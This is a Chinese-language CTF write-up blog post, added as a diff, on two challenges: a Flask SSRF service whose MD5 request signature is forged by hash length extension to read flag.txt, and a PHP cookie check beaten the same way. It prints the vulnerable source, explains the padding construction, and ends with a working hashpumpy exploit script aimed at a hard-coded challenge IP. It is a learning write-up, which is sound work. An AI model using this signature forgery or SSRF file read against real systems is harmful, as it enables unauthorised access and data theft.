@@ -1,0 +1,245 @@
+---
+layout: post
+title:  "2019-11-26-02"
+description: 所谓经典关照现实
+date:   2019-11-26-02
+tags: ssrf hash哈希长度扩展攻击 python
+excerpt_separator: ~~~
+---
+1.ssrf内网攻击
+
+2.hash哈希长度扩展攻击 参考: http://shaobaobaoer.cn/archives/535/hash%E9%95%BF%E5%BA%A6%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB-by-shaobaobaoer
+
+~~~
+首先打开网站
+
+![My helpful screenshot](/assets/img/2019-11-26-02/1.png)
+
+将这部分源码整合
+```python
+#! /usr/bin/env python 
+#encoding=utf-8 
+from flask import Flask 
+from flask import request 
+import socket 
+import hashlib 
+import urllib 
+import sys 
+import os 
+import json 
+
+reload(sys) 
+sys.setdefaultencoding('latin1') 
+app = Flask(__name__) 
+secert_key = os.urandom(16) 
+class Task: 
+	def __init__(self, action, param, sign, ip): 
+	self.action = action 
+	self.param = param 
+	self.sign = sign 
+	self.sandbox = md5(ip) 
+	if(not os.path.exists(self.sandbox)): 
+		#SandBox For Remote_Addr 
+		os.mkdir(self.sandbox) 
+
+	def Exec(self): 
+		result = {} 
+		result['code'] = 500 
+		if (self.checkSign()): 
+			if "scan" in self.action: 
+				tmpfile = open("./%s/result.txt" % self.sandbox, 'w') 
+				resp = scan(self.param) #param是一个请求的网址
+				if (resp == "Connection Timeout"): 
+					result['data'] = resp 
+				else: 
+					print resp 
+					tmpfile.write(resp) 
+					tmpfile.close() 
+				result['code'] = 200 
+			if "read" in self.action: 
+				f = open("./%s/result.txt" % self.sandbox, 'r')
+				result['code'] = 200 
+				result['data'] = f.read() 
+				if result['code'] == 500: 
+					result['data'] = "Action Error" 
+				else: 
+					result['code'] = 500 
+					result['msg'] = "Sign Error" 
+					return result 
+
+	def checkSign(self): 
+		if (getSign(self.action, self.param) == self.sign): 
+			return True 
+		else: 
+			return False 
+
+#generate Sign For Action Scan. 
+@app.route("/geneSign", methods=['GET', 'POST'])#先输入param生成sign
+def geneSign():
+	param = urllib.unquote(request.args.get("param", "")) 
+	action = "scan" #固定了值注意
+	return getSign(action, param) 
+
+@app.route('/De1ta',methods=['GET','POST']) #将上面输入的param和生成的sign和action(其值为"scan")输入
+def challenge(): 
+	action = urllib.unquote(request.cookies.get("action")) 
+	param = urllib.unquote(request.args.get("param", "")) 
+	sign = urllib.unquote(request.cookies.get("sign")) 
+	ip = request.remote_addr 
+	if(waf(param)): 
+		return "No Hacker!!!!" 
+	task = Task(action, param, sign, ip) 
+	return json.dumps(task.Exec()) 
+
+@app.route('/') 
+def index(): 
+	return open("code.txt","r").read() 
+
+def scan(param): 
+	socket.setdefaulttimeout(1) 
+	try: 
+		return urllib.urlopen(param).read()[:50] 
+	except: 
+		return "Connection Timeout" 
+
+def getSign(action, param): 
+	return hashlib.md5(secert_key + param + action).hexdigest() 
+
+def md5(content): 
+	return hashlib.md5(content).hexdigest() 
+
+def waf(param): 
+	check=param.strip().lower() #strip() 方法用于移除字符串头尾指定的字符（默认为空格或换行符）,且改为全小写
+	if check.startswith("gopher") or check.startswith("file"): #不能以gopher和file开头
+		return True 
+	else: 
+		return False 
+
+if __name__ == '__main__': 
+	app.debug = False app.run(host='0.0.0.0',port=80)
+```
+我其实已经看出它的意思了,在代码中有注释
+
+简单来说就是
+
+1.由param的值和固定的action值('scan')生成sign
+
+2.由1生成的sign加与一一样的param的值,再加action的值(为'scan'),就可以得到200的http响应
+
+但问题来了:
+
+1.既然是ssrf,为什么param的值为www.baidu.com的值无效(外网无法访问,考虑内网)
+
+2.给出的'read'判断语句一定是有用的,初步判定是将什么写进去,然后再读出来(但一来不知道该目录下有什么存着flag的文件,二来既然都固定了action,怎么做到满足条件)
+
+好吧,难得做到这,只能看wp了
+
+我的天,题目那还有个view hint没有留意
+
+![My helpful screenshot](/assets/img/2019-11-26-02/2.png)
+
+本来还以为要文件包含呢,这下一来思路就清晰了.
+
+通过ssrf将flag.txt写入某个文件,然后再读该文件,就可以看到flag了
+
+那如何构造呢?既然都已经固定了action
+
+这时候就要灵活一点了,这个点是关键
+```
+param + action
+```
+第一个请求找sign时是action固定,第二个请求写文件时是param固定(要flag.txt)
+
+那刚好,第一个请求
+```
+flag.txtread + scan
+```
+第二个请求
+```
+flag.txt + readscan
+```
+即可读到flag
+
+![My helpful screenshot](/assets/img/2019-11-26-02/3.png)
+
+![My helpful screenshot](/assets/img/2019-11-26-02/4.png)
+
+## hash哈希长度扩展攻击
+参考: http://shaobaobaoer.cn/archives/535/hash%E9%95%BF%E5%BA%A6%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB-by-shaobaobaoer
+```php
+<?php 
+
+$flag = "flag{flag is here}";
+$secret = "aaaaabbbbbccccc"; // This secret is 15 characters long for security!
+
+@$username = $_POST["username"];
+@$password = $_POST["password"];
+if (!empty($_COOKIE["getmein"])) {
+    if (urldecode($username) === "admin" && urldecode($password) != "admin") {
+        if ($_COOKIE["getmein"] === md5($secret . urldecode($username . $password))) {
+            echo "Congratulations! You are a registered user.\n";
+            die ("The flag is ". $flag);
+        }
+        else {
+            die ("Your cookies don't match up! STOP HACKING THIS SITE.");
+        }
+    }
+    else {
+        die ("You are not an admin! LEAVE.");
+    }
+}
+
+setcookie("sample-hash", md5($secret . urldecode("admin" . "admin")), time() + (60 * 60 * 24 * 7));
+
+if (empty($_COOKIE["source"])) {
+    setcookie("source", 0, time() + (60 * 60 * 24 * 7));
+}
+else {
+    if ($_COOKIE["source"] != 0) {
+        echo ""; // This source code is outputted here
+    }
+}
+?>
+```
+这道题的意思就是让你构造getmein和password($secret未知,$username为admin)使得
+```
+$_COOKIE["getmein"] === md5($secret . urldecode($username . $password))
+```
+一般情况下,如果已知$secret,可随便输入一个$password,然后将得出的MD5值作为getmein的输入值,这个等式就成立啦
+
+但此时$secret未知
+
+由setcookie("sample-hash", md5($secret . urldecode("admin" . "admin"))可以知道
+
+当$password为admin时,MD5的值
+
+此时通过hash哈希长度扩展攻击,利用$password为admin时,MD5的值作为下一轮的链变量,
+
+构造$password
+```
+password = "admin"(注:与第一轮(setcookie那)的值相同,即admin) + '\x80' + '\x00' * 38(数目可能不太对,填够56字节) + '\x88' + '\x00' * 7 (前面是第一轮,一共512位,即64字节)+ "whaleCTF"(开始第二轮512位,后面会自动补齐,不用管)
+```
+拿第一轮链变量和输入值whaleCTF可以得出第二轮的MD5值,此MD5值即等于输入以上password得到的MD5值(原理是以上构造出来的相当于以admin作为第一轮输入,whaleCTF为第二轮输入值)
+
+## 于是这道题可这样构造:
+```python
+import hashpumpy
+import requests
+import urllib.parse
+
+txt1 = 'flag.txt'
+r = requests.get('http://139.180.128.86/geneSign', params={'param': txt1})
+sign = r.text
+hash_sign = hashpumpy.hashpump(sign, txt1 + 'scan', 'read', 16)
+
+r = requests.get('http://139.180.128.86/De1ta', params={'param': txt1}, cookies={
+    'sign': hash_sign[0],
+    'action': urllib.parse.quote(hash_sign[1][len(txt1):])
+})
+
+print(r.text)
+```
+## 知识点:
+1.ssrf内网攻击
+
+2.hash哈希长度扩展攻击 参考: http://shaobaobaoer.cn/archives/535/hash%E9%95%BF%E5%BA%A6%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB-by-shaobaobaoer
